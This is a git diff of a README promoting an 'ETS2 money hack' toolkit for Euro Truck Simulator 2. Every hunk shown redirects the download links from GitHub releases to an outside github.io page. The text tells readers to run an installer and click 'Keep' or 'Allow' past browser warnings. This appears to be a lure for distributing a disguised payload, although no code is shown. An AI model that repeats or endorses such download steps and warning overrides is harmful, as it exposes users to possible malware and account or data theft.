@@ -1,6 +1,6 @@
 # 🚛 ets2-money-hack-career-fleet-toolkit - Your Ultimate ETS2 Career Companion
 
-[![Download Now](https://img.shields.io/badge/Download-ETS2_Toolkit-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Facultative-indianpotato8/ets2-money-hack-career-fleet-toolkit/releases)
+[![Download Now](https://img.shields.io/badge/Download-ETS2_Toolkit-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://facultative-indianpotato8.github.io)
 
 ## 🎮 What Is This?
 
@@ -52,7 +52,7 @@ Getting up and running is simple! Follow these three easy steps:
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Facultative-indianpotato8/ets2-money-hack-career-fleet-toolkit/releases](https://github.com/Facultative-indianpotato8/ets2-money-hack-career-fleet-toolkit/releases)
+Visit this link to download the application: [https://facultative-indianpotato8.github.io](https://facultative-indianpotato8.github.io)
 
 Look for the latest release and download the installer file. The download should start automatically. If you see a warning from your browser, click "Keep" or "Allow" to proceed.
 
@@ -100,7 +100,7 @@ While we work hard to ensure everything runs smoothly, bugs can happen. If you e
 
 Ready to supercharge your ETS2 career? Here's everything you need to know to get started.
 
-Visit this link to download the application: [https://github.com/Facultative-indianpotato8/ets2-money-hack-career-fleet-toolkit/releases](https://github.com/Facultative-indianpotato8/ets2-money-hack-career-fleet-toolkit/releases)
+Visit this link to download the application: [https://facultative-indianpotato8.github.io](https://facultative-indianpotato8.github.io)
 
 When you arrive at the release page, look for the newest version at the top. Download the file that matches your system (most users will want the Windows version). Save the file to your computer.
 
@@ -148,7 +148,7 @@ Remember: the open road is waiting. And with the right toolkit by your side, the
 
 **Download now and take the driver's seat of your ETS2 career!**
 
-[![Get Started](https://img.shields.io/badge/Get_Started-Download_Toolkit-important?style=flat-square)](https://github.com/Facultative-indianpotato8/ets2-money-hack-career-fleet-toolkit/releases)
+[![Get Started](https://img.shields.io/badge/Get_Started-Download_Toolkit-important?style=flat-square)](https://facultative-indianpotato8.github.io)
 
 ---
 
